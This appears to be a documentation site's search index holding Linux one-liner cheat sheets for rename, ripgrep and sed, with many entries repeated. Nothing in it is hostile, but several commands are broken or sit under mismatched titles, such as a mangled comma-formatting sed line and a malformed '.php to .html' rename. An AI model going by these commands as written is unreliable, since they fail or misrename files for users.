directory to lowercase rename 'y/A-Z/a-z/' * Title Case Files rename 's/\\b((?!(a|of|that|to)\\b)[a-z]+)/\\u$1/g' * convert uppercase files to lowercase files rename 'y/A-Z/a-z/' * Change the extension of a filename by using rename to convert rename .JPG .jpg *.JPG replace strings in file names rename 's/foo/bar/g' foobar Clean up poorly named TV shows. rename -v 's/.*[s,S](\\d{2}).*[e,E](\\d{2}).*\\.avi/SHOWNAME\\ S$1E$2.avi/' poorly.named.file.s01e01.avi Yet Another Rename (bash function) rename (){ txtToReplace = ${ 1 } ; replacementTxt = ${ 2 } ; shift 2 ; files = ${ @ } ; for file in $files ; do mv ${ file } ${ file / ${ txtToReplace } / ${ replacementTxt }} ; done ; } Convert spaces in file names to underscores rename 'y/ /_/' * Rename all .jpeg and .JPG files to have .jpg extension rename 's/\\.jpe?g$/.jpg/i' * Replace spaces in a filename with hyphens rename 's/ /-/g' * replace spaces in filenames with underscores rename 'y/ /_/' * Copy/move a bunch of files to dot files and back rename s/^/./ * Replace spaces in filenames with underscores rename -v 's/ /_/g' * Rename all .jpeg and .JPG files to .jpg rename 's/\\.jpeg/\\.jpg/' *.jpeg ; rename 's/\\.JPG/\\.jpg/' *.JPG Rename files in batch rename 's/^hospital\\.php\\?loc=(\\d{4})$/hospital_$1/' hospital.php* Batch rename extension of all files in a folder, in the example from .txt to .md rename 's/\\.txt$/\\.md$/i' * Title Case Files rename 's/(^|[\\s\\(\\)\\[\\]_-])([a-z])/$1\\u$2/g' * Title Case Files rename 's/\\b([a-z])/\\u$1/g' * Add prefix onto filenames rename 's/^/prefix/' * Tracklist reaplace backspace to '-' rename 's/ /-/g' *.mp3 Files extension change rename .oldextension .newextension *.oldextension Numeric zero padding file rename rename 's/\\d+/sprintf(\"%04d\",$&)/e' *.jpg Adding Prefix to File name rename 's/^/PREFIX/g' * Adding Prefix to File name rename 's/^/CS749__/' *.pdf renames multiple files that match the pattern rename 's/foo/bar/g' * space to underscore across single directory rename ' ' '_' * Replace all the spaces in all the filenames of the current directory and including directories with underscores. rename \"s/ /_/g\" * .* Adding leading zeros to a filename (1.jpg -> 001.jpg) rename.ul \"\" 00 ?.jpg ; rename \"\" 0 ??.jpg ; Replace Space In Filenames With Underscore rename 's/ /_/g' * Rename with regular expression and leading zeros rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt","title":"rename"},{"location":"linux/rename/#rename","text":"","title":"rename"},{"location":"linux/rename/#remove-all-parentheses-from-filefolder-names","text":"rename \"(\" \"\" *","title":"Remove all Parentheses from file/folder names"},{"location":"linux/rename/#remove-all-parentheses-from-filefolder-names_1","text":"rename \")\" \"\" *","title":"Remove all Parentheses from file/folder names"},{"location":"linux/rename/#rename-all-spaces-to-underscore","text":"for file in * ' ' * ; do mv -- \" $file \" \" ${ file // /_ } \" ; done","title":"Rename all spaces to underscore"},{"location":"linux/rename/#rename-all-files-with-spaces-to-underscore","text":"for file in * ; do mv -- \" $file \" \" ${ file // /_ } \" ; done","title":"Rename all files with spaces to underscore"},{"location":"linux/rename/#rename-uppercase-to-lowercase","text":"for i in * ; do mv $i ` echo $i | tr 'A-Z' 'a-z' ` ; done for i in $( ls | grep [ A-Z ] ) ; do mv -i $i ` echo $i | tr 'A-Z' 'a-z' ` ; done","title":"Rename uppercase to lowercase"},{"location":"linux/rename/#rename-all-uppercase-to-lowercase","text":"rename 'y/A-Z/a-z/' *","title":"Rename all uppercase to lowercase"},{"location":"linux/rename/#remove-sh-file-extension-for-files-in-current-directory","text":"rename 's/\\.sh//' ./* ### remove all spaces from all files in current folder ``` sh rename 's/ //g' *","title":"Remove .sh file extension for files in current directory"},{"location":"linux/rename/#renamed-multiple-file-from-php-to-html","text":"rename s/ .php/ .html/ *.html","title":"renamed multiple file from .php to .html"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores","text":"rename 's/ /_/g' *","title":"Replace spaces in filenames with underscores"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md","text":"rename *.JPG *.jpg","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#renames-all-files-in-the-current-directory-such-that-the-new-file-contains-no-space-characters","text":"rename 's/ /_/g' *","title":"Renames all files in the current directory such that the new file contains no space characters."},{"location":"linux/rename/#batch-file-suffix-renaming","text":"rename -n \"s/-.*//\" *","title":"Batch file suffix renaming"},{"location":"linux/rename/#rename-all-files-which-contain-the-sub-string-foo-replacing-it-with-bar","text":"rename foo bar directory/filename","title":"Rename all files which contain the sub-string 'foo', replacing it with 'bar'"},{"location":"linux/rename/#rename-all-files-which-contain-the-sub-string-foo-replacing-it-with-bar_1","text":"rename foo bar filename","title":"Rename all files which contain the sub-string 'foo', replacing it with 'bar'"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md_1","text":"rename .txt .md *.txt","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#rename-all-files-which-contain-the-sub-string-foo-replacing-it-with-bar_2","text":"rename 's/foo/bar/g' ./*","title":"Rename all files which contain the sub-string 'foo', replacing it with 'bar'"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md_2","text":"rename 's/.txt/.md/i' *","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#convert-single-digit-to-double-digits","text":"rename 's/\\d+/sprintf(\"%02d\",$&)/e' $@","title":"convert single digit to double digits"},{"location":"linux/rename/#replace-space-in-filename","text":"rename \"s/ *//g\" *.jpg","title":"Replace space in filename"},{"location":"linux/rename/#command-to-rename-multiple-file-in-one-go","text":"rename 's/.xls/.ods/g' *.xls","title":"Command to rename multiple file in one go"},{"location":"linux/rename/#convert-filenames-in-current-directory-to-lowercase","text":"rename 'y/A-Z/a-z/' *","title":"convert filenames in current directory to lowercase"},{"location":"linux/rename/#title-case-files","text":"rename 's/\\b((?!(a|of|that|to)\\b)[a-z]+)/\\u$1/g' *","title":"Title Case Files"},{"location":"linux/rename/#convert-uppercase-files-to-lowercase-files","text":"rename 'y/A-Z/a-z/' *","title":"convert uppercase files to lowercase files"},{"location":"linux/rename/#change-the-extension-of-a-filename-by-using-rename-to-convert","text":"rename .JPG .jpg *.JPG","title":"Change the extension of a filename by using rename to convert"},{"location":"linux/rename/#replace-strings-in-file-names","text":"rename 's/foo/bar/g' foobar","title":"replace strings in file names"},{"location":"linux/rename/#clean-up-poorly-named-tv-shows","text":"rename -v 's/.*[s,S](\\d{2}).*[e,E](\\d{2}).*\\.avi/SHOWNAME\\ S$1E$2.avi/' poorly.named.file.s01e01.avi","title":"Clean up poorly named TV shows."},{"location":"linux/rename/#yet-another-rename-bash-function","text":"rename (){ txtToReplace = ${ 1 } ; replacementTxt = ${ 2 } ; shift 2 ; files = ${ @ } ; for file in $files ; do mv ${ file } ${ file / ${ txtToReplace } / ${ replacementTxt }} ; done ; }","title":"Yet Another Rename (bash function)"},{"location":"linux/rename/#convert-spaces-in-file-names-to-underscores","text":"rename 'y/ /_/' *","title":"Convert spaces in file names to underscores"},{"location":"linux/rename/#rename-all-jpeg-and-jpg-files-to-have-jpg-extension","text":"rename 's/\\.jpe?g$/.jpg/i' *","title":"Rename all .jpeg and .JPG files to have .jpg extension"},{"location":"linux/rename/#replace-spaces-in-a-filename-with-hyphens","text":"rename 's/ /-/g' *","title":"Replace spaces in a filename with hyphens"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_1","text":"rename 'y/ /_/' *","title":"replace spaces in filenames with underscores"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_2","text":"rename 'y/ /_/' *","title":"replace spaces in filenames with underscores"},{"location":"linux/rename/#copymove-a-bunch-of-files-to-dot-files-and-back","text":"rename s/^/./ *","title":"Copy/move a bunch of files to dot files and back"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_3","text":"rename -v 's/ /_/g' *","title":"Replace spaces in filenames with underscores"},{"location":"linux/rename/#rename-all-jpeg-and-jpg-files-to-jpg","text":"rename 's/\\.jpeg/\\.jpg/' *.jpeg ; rename 's/\\.JPG/\\.jpg/' *.JPG","title":"Rename all .jpeg and .JPG files to .jpg"},{"location":"linux/rename/#rename-files-in-batch","text":"rename 's/^hospital\\.php\\?loc=(\\d{4})$/hospital_$1/' hospital.php*","title":"Rename files in batch"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md_3","text":"rename 's/\\.txt$/\\.md$/i' *","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#title-case-files_1","text":"rename 's/(^|[\\s\\(\\)\\[\\]_-])([a-z])/$1\\u$2/g' *","title":"Title Case Files"},{"location":"linux/rename/#title-case-files_2","text":"rename 's/\\b([a-z])/\\u$1/g' *","title":"Title Case Files"},{"location":"linux/rename/#add-prefix-onto-filenames","text":"rename 's/^/prefix/' *","title":"Add prefix onto filenames"},{"location":"linux/rename/#tracklist-reaplace-backspace-to--","text":"rename 's/ /-/g' *.mp3","title":"Tracklist reaplace backspace to '-'"},{"location":"linux/rename/#files-extension-change","text":"rename .oldextension .newextension *.oldextension","title":"Files extension change"},{"location":"linux/rename/#numeric-zero-padding-file-rename","text":"rename 's/\\d+/sprintf(\"%04d\",$&)/e' *.jpg","title":"Numeric zero padding file rename"},{"location":"linux/rename/#adding-prefix-to-file-name","text":"rename 's/^/PREFIX/g' *","title":"Adding Prefix to File name"},{"location":"linux/rename/#adding-prefix-to-file-name_1","text":"rename 's/^/CS749__/' *.pdf","title":"Adding Prefix to File name"},{"location":"linux/rename/#renames-multiple-files-that-match-the-pattern","text":"rename 's/foo/bar/g' *","title":"renames multiple files that match the pattern"},{"location":"linux/rename/#space-to-underscore-across-single-directory","text":"rename ' ' '_' *","title":"space to underscore across single directory"},{"location":"linux/rename/#replace-all-the-spaces-in-all-the-filenames-of-the-current-directory-and-including-directories-with-underscores","text":"rename \"s/ /_/g\" * .*","title":"Replace all the spaces in all the filenames of the current directory and including directories with underscores."},{"location":"linux/rename/#adding-leading-zeros-to-a-filename-1jpg---001jpg","text":"rename.ul \"\" 00 ?.jpg ; rename \"\" 0 ??.jpg ;","title":"Adding leading zeros to a filename (1.jpg -&gt; 001.jpg)"},{"location":"linux/rename/#replace-space-in-filenames-with-underscore","text":"rename 's/ /_/g' *","title":"Replace Space In Filenames With Underscore"},{"location":"linux/rename/#rename-with-regular-expression-and-leading-zeros","text":"rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt","title":"Rename with regular expression and leading zeros"},{"location":"linux/rename/#rename-with-regular-expression-and-leading-zeros_1","text":"rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt","title":"Rename with regular expression and leading zeros"},{"location":"linux/rename/#convert-uppercase-files-to-lowercase-files_1","text":"rename -fc *","title":"convert uppercase files to lowercase files"},{"location":"linux/rename/#adds-characters-at-the-beginning-of-the-name-of-a-file","text":"rename 's/.*/[it]$&/' *.pdf","title":"Adds characters at the beginning of the name of a file"},{"location":"linux/rename/#remove-all-spaces-from-all-files-in-current-folder","text":"rename 's/ //g' *","title":"remove all spaces from all files in current folder"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_4","text":"rename 's/ /_/g' *","title":"Replace spaces in filenames with underscores"},{"location":"linux/rename/#rename-all-files-which-contain-the-sub-string-foo-replacing-it-with-bar_3","text":"rename 's/foo/bar/g' ./*","title":"Rename all files which contain the sub-string 'foo', replacing it with 'bar'"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md_4","text":"rename 's/.txt/.md/i' *","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#convert-single-digit-to-double-digits_1","text":"rename 's/\\d+/sprintf(\"%02d\",$&)/e' $@","title":"convert single digit to double digits"},{"location":"linux/rename/#replace-space-in-filename_1","text":"rename \"s/ *//g\" *.jpg","title":"Replace space in filename"},{"location":"linux/rename/#command-to-rename-multiple-file-in-one-go_1","text":"rename 's/.xls/.ods/g' *.xls","title":"Command to rename multiple file in one go"},{"location":"linux/rename/#convert-filenames-in-current-directory-to-lowercase_1","text":"rename 'y/A-Z/a-z/' *","title":"convert filenames in current directory to lowercase"},{"location":"linux/rename/#title-case-files_3","text":"rename 's/\\b((?!(a|of|that|to)\\b)[a-z]+)/\\u$1/g' *","title":"Title Case Files"},{"location":"linux/rename/#convert-uppercase-files-to-lowercase-files_2","text":"rename 'y/A-Z/a-z/' *","title":"convert uppercase files to lowercase files"},{"location":"linux/rename/#change-the-extension-of-a-filename-by-using-rename-to-convert_1","text":"rename .JPG .jpg *.JPG","title":"Change the extension of a filename by using rename to convert"},{"location":"linux/rename/#replace-strings-in-file-names_1","text":"rename 's/foo/bar/g' foobar","title":"replace strings in file names"},{"location":"linux/rename/#clean-up-poorly-named-tv-shows_1","text":"rename -v 's/.*[s,S](\\d{2}).*[e,E](\\d{2}).*\\.avi/SHOWNAME\\ S$1E$2.avi/' poorly.named.file.s01e01.avi","title":"Clean up poorly named TV shows."},{"location":"linux/rename/#yet-another-rename-bash-function_1","text":"rename (){ txtToReplace = ${ 1 } ; replacementTxt = ${ 2 } ; shift 2 ; files = ${ @ } ; for file in $files ; do mv ${ file } ${ file / ${ txtToReplace } / ${ replacementTxt }} ; done ; }","title":"Yet Another Rename (bash function)"},{"location":"linux/rename/#convert-spaces-in-file-names-to-underscores_1","text":"rename 'y/ /_/' *","title":"Convert spaces in file names to underscores"},{"location":"linux/rename/#rename-all-jpeg-and-jpg-files-to-have-jpg-extension_1","text":"rename 's/\\.jpe?g$/.jpg/i' *","title":"Rename all .jpeg and .JPG files to have .jpg extension"},{"location":"linux/rename/#replace-spaces-in-a-filename-with-hyphens_1","text":"rename 's/ /-/g' *","title":"Replace spaces in a filename with hyphens"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_5","text":"rename 'y/ /_/' *","title":"replace spaces in filenames with underscores"},{"location":"linux/rename/#copymove-a-bunch-of-files-to-dot-files-and-back_1","text":"rename s/^/./ *","title":"Copy/move a bunch of files to dot files and back"},{"location":"linux/rename/#replace-spaces-in-filenames-with-underscores_6","text":"rename -v 's/ /_/g' *","title":"Replace spaces in filenames with underscores"},{"location":"linux/rename/#rename-all-jpeg-and-jpg-files-to-jpg_1","text":"rename 's/\\.jpeg/\\.jpg/' *.jpeg ; rename 's/\\.JPG/\\.jpg/' *.JPG","title":"Rename all .jpeg and .JPG files to .jpg"},{"location":"linux/rename/#rename-files-in-batch_1","text":"rename 's/^hospital\\.php\\?loc=(\\d{4})$/hospital_$1/' hospital.php*","title":"Rename files in batch"},{"location":"linux/rename/#batch-rename-extension-of-all-files-in-a-folder-in-the-example-from-txt-to-md_5","text":"rename 's/\\.txt$/\\.md$/i' *","title":"Batch rename extension of all files in a folder, in the example from .txt to .md"},{"location":"linux/rename/#title-case-files_4","text":"rename 's/(^|[\\s\\(\\)\\[\\]_-])([a-z])/$1\\u$2/g' *","title":"Title Case Files"},{"location":"linux/rename/#title-case-files_5","text":"rename 's/\\b([a-z])/\\u$1/g' *","title":"Title Case Files"},{"location":"linux/rename/#add-prefix-onto-filenames_1","text":"rename 's/^/prefix/' *","title":"Add prefix onto filenames"},{"location":"linux/rename/#tracklist-reaplace-backspace-to--_1","text":"rename 's/ /-/g' *.mp3","title":"Tracklist reaplace backspace to '-'"},{"location":"linux/rename/#files-extension-change_1","text":"rename .oldextension .newextension *.oldextension","title":"Files extension change"},{"location":"linux/rename/#numeric-zero-padding-file-rename_1","text":"rename 's/\\d+/sprintf(\"%04d\",$&)/e' *.jpg","title":"Numeric zero padding file rename"},{"location":"linux/rename/#adding-prefix-to-file-name_2","text":"rename 's/^/PREFIX/g' *","title":"Adding Prefix to File name"},{"location":"linux/rename/#adding-prefix-to-file-name_3","text":"rename 's/^/CS749__/' *.pdf","title":"Adding Prefix to File name"},{"location":"linux/rename/#renames-multiple-files-that-match-the-pattern_1","text":"rename 's/foo/bar/g' *","title":"renames multiple files that match the pattern"},{"location":"linux/rename/#space-to-underscore-across-single-directory_1","text":"rename ' ' '_' *","title":"space to underscore across single directory"},{"location":"linux/rename/#replace-all-the-spaces-in-all-the-filenames-of-the-current-directory-and-including-directories-with-underscores_1","text":"rename \"s/ /_/g\" * .*","title":"Replace all the spaces in all the filenames of the current directory and including directories with underscores."},{"location":"linux/rename/#adding-leading-zeros-to-a-filename-1jpg---001jpg_1","text":"rename.ul \"\" 00 ?.jpg ; rename \"\" 0 ??.jpg ;","title":"Adding leading zeros to a filename (1.jpg -&gt; 001.jpg)"},{"location":"linux/rename/#replace-space-in-filenames-with-underscore_1","text":"rename 's/ /_/g' *","title":"Replace Space In Filenames With Underscore"},{"location":"linux/rename/#rename-with-regular-expression-and-leading-zeros_2","text":"rename 's/result_([0-9]+)_([0-9]+)_([0-9]+)\\.json\\.txt/sprintf(\"%d%02d%02d.txt\",$3,$2,$1)/ge' result_*.txt","title":"Rename with regular expression and leading zeros"},{"location":"linux/rg/","text":"ripgrep Set colors for matching in .bashrc alias rg = \"rg --colors 'match:none' \\ --colors 'match:bg:0x33,0x66,0xFF' \\ --colors 'match:fg:white' \\ --colors 'match:style:bold'\" List matching files only rg -l foo Files Without a Match rg --files-without-match '\\b(var|let|const)\\b' Use -v to filter out all matches so that only non-matches are left. rg 'bar' | rg -v 'foobar' Displays built-in available types and their corresponding globs rg --type-list Only search in .sh files, -g can be used mulitple tiomes rg -g '*.sh' foo Serach in all files excempt .sh files, -g can be used mulitple tiomes rg -g '!*.sh' foo The following command restricts the search for the pattern key to json files only. rg key -t json","title":"ripgrep"},{"location":"linux/rg/#ripgrep","text":"","title":"ripgrep"},{"location":"linux/rg/#set-colors-for-matching-in-bashrc","text":"alias rg = \"rg --colors 'match:none' \\ --colors 'match:bg:0x33,0x66,0xFF' \\ --colors 'match:fg:white' \\ --colors 'match:style:bold'\"","title":"Set colors for matching in .bashrc"},{"location":"linux/rg/#list-matching-files-only","text":"rg -l foo","title":"List matching files only"},{"location":"linux/rg/#files-without-a-match","text":"rg --files-without-match '\\b(var|let|const)\\b'","title":"Files Without a Match"},{"location":"linux/rg/#use--v-to-filter-out-all-matches-so-that-only-non-matches-are-left","text":"rg 'bar' | rg -v 'foobar'","title":"Use -v to filter out all matches so that only non-matches are left."},{"location":"linux/rg/#displays-built-in-available-types-and-their-corresponding-globs","text":"rg --type-list","title":"Displays built-in available types and their corresponding globs"},{"location":"linux/rg/#only-search-in-sh-files--g-can-be-used-mulitple-tiomes","text":"rg -g '*.sh' foo","title":"Only search in .sh files, -g can be used mulitple tiomes"},{"location":"linux/rg/#serach-in-all-files-excempt-sh-files--g-can-be-used-mulitple-tiomes","text":"rg -g '!*.sh' foo","title":"Serach in all files excempt .sh files, -g can be used mulitple tiomes"},{"location":"linux/rg/#the-following-command-restricts-the-search-for-the-pattern-key-to-json-files-only","text":"rg key -t json","title":"The following command restricts the search for the pattern key to json files only."},{"location":"linux/sed/","text":"sed Stream Editor for filtering and transforming text, really handy one-liners for SED Insert a new string above and below matched string echo netstat | sed 's/netstat.*/```sh \\n&\\n```/g' > netstat.md Insert a new string above and below matched string echo \"hello world\" | sed 's/world/\\n&/g' hello world Insert a new string above and below matched string sed \"s/regexp/\\\\`echo -e '\\n\\r'`/g\" ```` ### Method 4: Make a new line after every comma ',' ``` sh echo one,two,three | sed 's/,/\\ /g' one two three Method 4: echo pattern | sed -E -e $'s/^(pattern)/\\\\\\n\\\\1/' pattern Insert a new string above and below matched string echo 'foobar' | sed -r 's/(bar)/\\n\\1/;' Add '''sh above curl, good for writiing wikis for example echo \" curl\" | sed 's/ curl/```sh\\n&/;s/$/\\n```/g' curl Replace 2 words with sans escaping echo \"Hello World\" | sed 's/\\(Hello\\)/World\\1/g' World Hello Double space a file sed G Double space a file which already has blank lines in it. Output fileshould contain no more than one blank line between lines of text. sed '/^$/d;G' Triple space a file sed 'G;G' Undo double-spacing (assumes even-numbered lines are always blank) sed 'n;d' Number each line of a file (simple left alignment). Using a tab (see note on 't' at end of file) instead of space will preserve margins. sed = filename | sed 'N;s/\\n/\\t/' Number each line of a file (number on left, right-aligned) sed = filename | sed 'N; s/^/ /; s/ *\\(.\\{6,\\}\\)\\n/\\1 /' Number each line of file, but only print numbers if line is not blank sed '/./=' filename | sed '/./N; s/\\n/ /' Count lines (emulates \"wc -l\") sed -n '$=' Delete leading whitespace (spaces, tabs) from front of each line aligns all text flush left see note on 't' at end of file sed 's/^[ \\t]*//' delete trailing whitespace (spaces, tabs) from end of each line sed 's/[ \\t]*$//' # see note on '\\t' at end of file Delete BOTH leading and trailing whitespace from each line sed 's/^[ \\t]*//;s/[ \\t]*$//' Insert 5 blank spaces at beginning of each line (make page offset) sed 's/^/ /' Align all text flush right on a 79-column width, set at 78 plus 1 space sed -e :a -e 's/^.\\{1,78\\}$/ &/;ta' Center all text in the middle of 79-column width. In method 1, spaces at the beginning of the line are significant, and trailing spaces are appended at the end of the line. In method 2, spaces at the beginning of the line are discarded in centering the line, and no trailing spaces appear at the end of lines. Method 1 sed -e :a -e 's/^.\\{1,77\\}$/ & /;ta' Method 2 sed -e :a -e 's/^.\\{1,77\\}$/ &/;ta' -e 's/\\( *\\)\\1/\\1/' Replaces only 1 st instance in a line sed 's/foo/bar/' Replaces only 4 th instance in a line sed 's/foo/bar/4' Replaces ALL instances in a line sed 's/foo/bar/g' Replace the next-to-last case sed 's/\\(.*\\)foo\\(.*foo\\)/\\1bar\\2/' Replace only the last case sed 's/\\(.*\\)foo/\\1bar/' Substitute \"foo\" with \"bar\" ONLY for lines which contain \"baz\" sed '/baz/s/foo/bar/g' Substitute \"foo\" with \"bar\" EXCEPT for lines which contain \"baz\" sed '/baz/!s/foo/bar/g' Change \"scarlet\" or \"ruby\" or \"puce\" to \"red\" Most seds sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g' GNU sed only gsed 's/scarlet\\|ruby\\|puce/red/g' Reverse order of lines (emulates \"tac\") bug/feature in HHsed v1.5 causes blank lines to be deleted Method 1 sed '1!G;h;$!d' Method 2 sed -n '1!G;h;$p' Reverse each character on the line (emulates \"rev\") sed '/\\n/!G;s/\\(.\\)\\(.*\\n\\)/&\\2\\1/;//D;s/.//' Join pairs of lines side-by-side (like \"paste\") sed '$!N;s/\\n/ /' If a line ends with a backslash, append the next line to it sed -e :a -e '/\\\\$/N; s/\\\\\\n//; ta' If a line begins with an equal sign, append it to the previous line and replace the \"=\" with a single space sed -e :a -e '$!N;s/\\n=/ /;ta' -e 'P;D' Add commas to numeric strings, changing \"1234567\" to \"1,234,567\" GNU sed only sh gsed ':a;s/\\B[0-9]\\{3\\}\\>/,&/;ta' Other seds sed -e :a -e 's/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta' Add commas to numbers with decimal points and minus signs (GNU sed) gsed ':a;s/ \\(^\\|[^0-9.]\\) \\([0-9]\\+\\) \\([0-9]\\{3\\}\\) /12,3/g;ta' ### Add a blank line every 5 lines (after lines 5, 10, 15, 20, etc.) * GNU sed only ```sh gsed '0~5G' Other seds sed 'n;n;n;n;G;' Print first 10 lines of file (emulates behavior of \"head\") sed 10q Print first line of file (emulates \"head -1\") sed q Print the last 10 lines of a file (emulates \"tail\") sed -e :a -e '$q;N;11,$D;ba' Print the last 2 lines of a file (emulates \"tail -2\") sed '$!N;$!D' Print the last line of a file (emulates \"tail -1\") Method 1 sed '$!d' Method 2 sed -n '$p' Print only lines which match regular expression (emulates \"grep\") Method 1 sed -n '/regexp/p' Method 2 sed '/regexp/!d' Print only lines which do NOT match regexp (emulates \"grep -v\") Method 1 sed -n '/regexp/!p' Method 2 sed '/regexp/d' Print the line immediately before a regexp, but not the line ccontaining the regexp sed -n '/regexp/{g;1!p;};h' Print the line immediately after a regexp, but not the line containing the regexp sed -n '/regexp/{n;p;}' Print 1 line of context before and after regexp, with line number indicating where the regexp occurred (similar to \"grep -A1 -B1\") sed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h Grep for AAA and BBB and CCC (in any order) sed '/AAA/!d; /BBB/!d; /CCC/!d' Grep for AAA and BBB and CCC (in that order) sed '/AAA.*BBB.*CCC/!d' Grep for AAA or BBB or CCC (emulates \"egrep\") Other seds sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d GNU sed only gsed '/AAA\\|BBB\\|CCC/!d' Print paragraph if it contains AAA (blank lines separate paragraphs) sed v1.5 must insert a 'G;' after 'x;' in the next 3 scripts below sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;' Print paragraph if it contains AAA and BBB and CCC (in any order) sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d' Print paragraph if it contains AAA or BBB or CCC sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d GNU Sed only gsed '/./{H;$!d;};x;/AAA\\|BBB\\|CCC/b;d' Print only lines of 65 characters or longer sed -n '/^.\\{65\\}/p' Print only lines of less than 65 characters Method 1 sed -n '/^.\\{65\\}/!p' Method 2 sed '/^.\\{65\\}/d' Print section of file from regular expression to end of file sed -n '/regexp/,$p' Print section of file based on line numbers (lines 8-12, inclusive) Method 1 sed -n '8,12p' Method 2 sed '8,12!d' Print line number 52 Method 1 sed -n '52p' Method 2 sed '52!d' Method 3 sed '52q;d' Beginning at line 3, print every 7 th line GNU Sed only gsed -n '3~7p' Other seds sed -n '3,${p;n;n;n;n;n;n;}' Print section of file between two regular expressions (inclusive) sed -n '/Iowa/,/Montana/p' Print all of file EXCEPT section between 2 regular expressions sed '/Iowa/,/Montana/d' Delete duplicate, consecutive lines from a file (emulates \"uniq\"). First line in a set of duplicate lines is kept, rest are deleted. sed '$!N; /^\\(.*\\)\\n\\1$/!P; D' Delete duplicate, nonconsecutive lines from a file. Beware not to overflow the buffer size of the hold space, or else use GNU sed. sh sed -n 'G; s/\\n/&&/; /^\\([ -~]*\\n\\).*\\n\\1/d; s/\\n//; h; P' Delete the first 10 lines of a file sed '1,10d' Delete the last line of a file sed '$d' Delete the last 2 lines of a file sed 'N;$!P;$!D;$d' Dlete the last 10 lines of a file Method 1 sed -e :a -e '$d;N;2,10ba' -e 'P;D' Method 2 sed -n -e :a -e '1,10!{P;N;D;};N;ba' Delete every 8 th line GNU sed only gsed '0~8d' Other seds sed 'n;n;n;n;n;n;n;d;' Delete ALL blank lines from a file (same as \"grep '.' \") Method 1 sed '/^$/d' Method 2 sed '/./!d' Delete all CONSECUTIVE blank lines from file except the first; also deletes all blank lines from top and end of file (emulates \"cat -s\") Method 1 sed '/./,/^$/!d' Method 2 sed '/^$/N;/\\n$/D' Delete all CONSECUTIVE blank lines from file except the first 2: sed '/^$/N;/\\n$/N;//D' Delete all leading blank lines at top of file sed '/./,$!d' Delete all trailing blank lines at end of file sed -e :a -e '/^\\n*$/N;/\\n$/ba' Delete the last line of each paragraph sed -n '/^$/{p;h;};/./{x;/./p;}' Deletes everything after first blank line sed '/^$/q' Deletes everything up to first blank line sed '1,/^$/d' Get Subject header, but remove initial \"Subject: \" portion sed '/^Subject: */!d; s///;q' Get return address header sed '/^Reply-To:/q; /^From:/h; /./d;g;q' Parse out the address proper. Pulls out the e-mail address by itself from the 1-line return address header (see preceding script) sed 's/ *(.*)//; s/>.*//; s/.*[:<] *//' Add a leading angle bracket and space to each line (quote a message) sed 's/^/> /' Delete leading angle bracket & space from each line (unquote a message) sed 's/^> //' ### Remove most HTML tags (accommodates multiple-line tags) ``` sh sed -e :a -e 's/<[^>]*>//g;/</N;//ba' Add one blank line between all of them with sed sed -i '0~1 a\\\\' Inserts one line every 3 rows. sed -i '0~3 a\\\\' Method 2: Inserts one line every 3 rows. sed -i 'G;G;G' Method 3: Inserts one line after every string and at end, make 2 empty lines sed ':a;G;s/n/&/1;Ta' Uppercasing First Letter of Words Using SED echo -e \"wuseman\" | sed -r 's/\\<./\\U&/g' Colorize a word echo START|sed ''/START/s//`printf \"\\033[32mSTART\\033[0m\"`/'' To print a specific line from a file sed -n 5p <file> uncomment the lines where the word DEBUG is found sed '/^#.*DEBUG.*/ s/^#//' $FILE convert a line to a space sed 's/.*/ /' find which lines in a file are longer than N characters sed -n \"/^.\\{73,\\}/p\" < /path/to/file Easy way to display yum repo priorities sed -n -e \"/^\\[/h; /priority *=/{ G; s/\\n/ /; s/ity=/ity = /; p }\" /etc/yum.repos.d/*.repo | sort -k3n Get your Speed Dial urls sed -n '/url/s#^.*url=\\(.*://.*\\)#\\1#p' ~/.mozilla/firefox/*. [ dD ] efault/SDBackups/*.speeddial | sort | uniq Search and replace pipes for tabs in file with backup sed -i.bak -e s/ \\| / \\\\ t/g filepath.tsv Remove/replace newline characters. sed ':a;N;$!ba;s/\\n/ /g' Append the line # - - coding: utf-8 - - to a file sed -i -e '1i \\# -*- coding: utf-8 -*-' yourfile.py Append a new line \"FOOBAR\" in all files matching the glob* sed -i '$a\\FOOBAR' * Simply clean playlist sed -e '/MP3$\\|mp3$\\|wma$\\|flac$/!d' <filename_source> > <filename_destination> delete all leading whitespace from each line in file sed 's/^[ \\t]*//' < <file> > <file>.out ; mv <file>.out <file> Sed file spacing sed G Convert an UNIX file to a DOS file. sed -i 's/$/\\r/' file truncate files without output redirection or temporary file creation sed -i 's/`head -n 500 foo.log`//' foo.log sed : using colons as separators instead of forward 